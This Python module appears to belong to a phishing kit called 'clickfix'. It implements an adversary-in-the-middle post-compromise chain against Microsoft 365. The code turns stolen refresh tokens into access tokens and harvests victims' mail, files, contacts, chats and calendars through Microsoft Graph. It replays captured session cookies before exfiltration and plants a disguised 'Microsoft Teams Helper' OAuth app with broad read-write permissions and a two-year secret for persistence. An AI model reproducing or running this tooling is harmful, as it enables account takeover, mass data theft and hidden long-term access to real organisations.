# language: Python 3.11+, file: cf/chain.py
# *AiTM edge chain — refresh token rotation, Graph pivot, OAuth persistence*
from __future__ import annotations

import json
import logging
from typing import Any, ClassVar

from .http import HttpClient, Rate, get_client
from .store import Store

LOG = logging.getLogger("clickfix.chain")

GRAPH = "https://graph.microsoft.com/v1.0"
LOGIN = "https://login.microsoftonline.com"
GRAPH_RATE = Rate(60, 60.0)


class AiTMEdgeChain:
    """Edge proxy captures session cookies and the POST body, the auth code
    gets exchanged for a refresh token, then the session stays alive and the
    Graph API opens the mailbox, files, chats and calendar.

    All calls go through the shared pooled client; every Graph collection is
    followed through @odata.nextLink so a pivot never silently truncates.
    """

    def __init__(
        self,
        store: Store,
        campaign_id: str,
        http: HttpClient | None = None,
    ) -> None:
        self.store = store
        self.cid = campaign_id
        self.http = http or get_client()

    # ─── token rotation ───
    async def refresh_token_to_access(
        self,
        client_id: str,
        refresh_token: str,
        scope: str = (
            "openid profile offline_access https://graph.microsoft.com/.default"
        ),
        tenant: str = "common",
    ) -> dict[str, Any]:
        """refresh -> access (+ rotated refresh token, Microsoft rotates on use)."""
        res = await self.http.request(
            "POST",
            f"{LOGIN}/{tenant}/oauth2/v2.0/token",
            data={
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "client_id": client_id,
                "scope": scope,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            rate=Rate(20, 60.0),
            rate_key="chain:token",
            expect_json=True,
        )
        body = res.get("body")
        if res["status"] != 200:
            return {
                "error": res["status"],
                "body": str(body)[:300],
            }
        out = body if isinstance(body, dict) else {}
        self.store.log_event(
            "",
            self.cid,
            "token_refresh",
            json.dumps(
                {
                    "client_id": client_id,
                    "expires_in": out.get("expires_in"),
                    "rotated": "refresh_token" in out,
                }
            ),
        )
        return out

    # ─── Graph pivot ───
    ENDPOINTS: ClassVar[dict[str, str]] = {
        "me": f"{GRAPH}/me",
        "messages": f"{GRAPH}/me/messages?$top=100",
        "files": f"{GRAPH}/me/drive/root/children?$top=200",
        "contacts": f"{GRAPH}/me/contacts?$top=100",
        "chats": f"{GRAPH}/me/chats?$top=50",
        "drives": f"{GRAPH}/me/drives",
        "calendar": f"{GRAPH}/me/events?$top=50",
        "team": f"{GRAPH}/me/joinedTeams",
        "inbox_rules": f"{GRAPH}/me/mailFolders/inbox/messageRules",
    }

    async def graph_pivot(
        self,
        access_token: str,
        what: list[str] | None = None,
        pages: int = 5,
    ) -> dict[str, Any]:
        wanted = what or ["me", "messages", "files", "contacts", "chats"]
        out: dict[str, Any] = {}
        for key in wanted:
            url = self.ENDPOINTS.get(key)
            if not url:
                out[key] = {"error": "unknown endpoint"}
                continue
            collected: list[Any] = []
            next_url: str | None = url
            errors: list[Any] = []
            page = 0
            while next_url and page < pages:
                res = await self.http.token_get(
                    next_url,
                    access_token,
                    rate=GRAPH_RATE,
                    rate_key="graph",
                    expect_json=True,
                )
                if res["status"] != 200:
                    errors.append(res["status"])
                    break
                body = res.get("body")
                if isinstance(body, dict) and isinstance(body.get("value"), list):
                    collected.extend(body["value"])
                    next_url = body.get("@odata.nextLink")
                else:
                    collected.append(body)
                    next_url = None
                page += 1
            entry: dict[str, Any] = {"count": len(collected)}
            if errors:
                entry["error"] = errors[0]
            if page >= pages and next_url:
                entry["truncated"] = True
                entry["next"] = next_url
            entry["sample"] = collected[:20]
            out[key] = entry
        self.store.log_event(
            "",
            self.cid,
            "graph_pivot",
            json.dumps({k: v.get("count", 0) for k, v in out.items()}),
        )
        return out

    # ─── persistence ───
    async def persist_oauth_app(
        self,
        tenant_id: str,
        access_token: str,
        display_name: str = "Microsoft Teams Helper",
        redirect_url: str = "https://localhost",
        secret_years: int = 2,
    ) -> dict[str, Any]:
        """Standing app registration: client secret + service principal.
        Admin consent is a separate, explicit step (grant_url)."""
        from datetime import datetime, timedelta, timezone

        headers = {"Content-Type": "application/json"}
        app = await self.http.request(
            "POST",
            f"{GRAPH}/applications",
            headers=headers,
            json_body={
                "displayName": display_name,
                "signInAudience": "AzureADMyOrg",
                "requiredResourceAccess": [
                    {
                        "resourceAppId": "00000003-0000-0000-c000-000000000000",
                        "resourceAccess": [
                            # User.Read
                            {"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
                             "type": "Scope"},
                            # Mail.Read
                            {"id": "810c84a8-4a9e-49e6-bf7d-12d183f40d01",
                             "type": "Role"},
                            # Files.ReadWrite.All
                            {"id": "75359482-378d-4052-8f01-80520e7db3cd",
                             "type": "Role"},
                            # Directory.ReadWrite.All
                            {"id": "9a5d68dd-52b0-4cc2-bda4-f62e3c8a7c78",
                             "type": "Role"},
                        ],
                    }
                ],
            },
            auth=f"Bearer {access_token}",
            rate=GRAPH_RATE,
            rate_key="graph",
            expect_json=True,
        )
        if app["status"] not in (200, 201):
            return {"error": app["status"], "body": str(app.get("body"))[:300]}
        body = app["body"] if isinstance(app["body"], dict) else {}
        object_id = body.get("id", "")
        app_client = body.get("appId", "")

        end = datetime.now(timezone.utc) + timedelta(days=365 * secret_years)
        sec = await self.http.request(
            "POST",
            f"{GRAPH}/applications/{object_id}/addPassword",
            headers=headers,
            json_body={
                "passwordCredential": {
                    "displayName": "sync",
                    "endDateTime": end.strftime("%Y-%m-%dT%H:%M:%SZ"),
                }
            },
            auth=f"Bearer {access_token}",
            rate=GRAPH_RATE,
            rate_key="graph",
            expect_json=True,
        )
        secret_txt = ""
        secret_failed = 0
        if sec["status"] == 200 and isinstance(sec.get("body"), dict):
            secret_txt = sec["body"].get("secretText", "")
            if not secret_txt:
                secret_failed = sec["status"]
        else:
            # a silent empty secret here cost an operator a whole triage
            # evening — name the failure at the boundary
            secret_failed = sec["status"]
            LOG.error(
                "addPassword failed: HTTP %s %s",
                sec["status"],
                str(sec.get("body"))[:200],
            )

        sp = await self.http.request(
            "POST",
            f"{GRAPH}/servicePrincipals",
            headers=headers,
            json_body={"appId": app_client},
            auth=f"Bearer {access_token}",
            rate=GRAPH_RATE,
            rate_key="graph",
            expect_json=True,
        )
        self.store.log_event(
            "",
            self.cid,
            "oauth_app_persist",
            json.dumps(
                {
                    "appId": app_client,
                    "secret": bool(secret_txt),
                    "sp": sp["status"] in (200, 201),
                }
            ),
        )
        return {
            "appId": app_client,
            "objectId": object_id,
            "client_secret": secret_txt,
            "secret_failed": secret_failed,
            "service_principal": sp["status"] in (200, 201),
            "secret_expires": end.strftime("%Y-%m-%d"),
            "note": "application scopes need admin consent before they issue tokens",
            "grant_url": (
                f"{LOGIN}/{tenant_id}/adminconsent"
                f"?client_id={app_client}&redirect_uri={redirect_url}"
            ),
        }

    async def session_from_cookies(
        self,
        url: str,
        cookies: dict[str, str],
        user_agent: str,
    ) -> dict[str, Any]:
        """Replay a captured cookie jar against an arbitrary URL — used to
        validate that the lifted session is still alive before exfil."""
        # a captured value with an embedded CRLF would smuggle a header —
        # strip ends and refuse pairs with interior control chars
        pairs = []
        for k, v in cookies.items():
            k, v = str(k).strip(), str(v).strip()
            if "\r" in k or "\n" in k or "\r" in v or "\n" in v:
                continue
            pairs.append(f"{k}={v}")
        cookie_header = "; ".join(pairs)
        res = await self.http.get(
            url,
            headers={"Cookie": cookie_header, "User-Agent": user_agent},
            rate=Rate(10, 60.0),
            rate_key="chain:replay",
        )
        return {
            "status": res["status"],
            "ok": res["ok"],
            "len": len(str(res.get("body") or "")),
        }
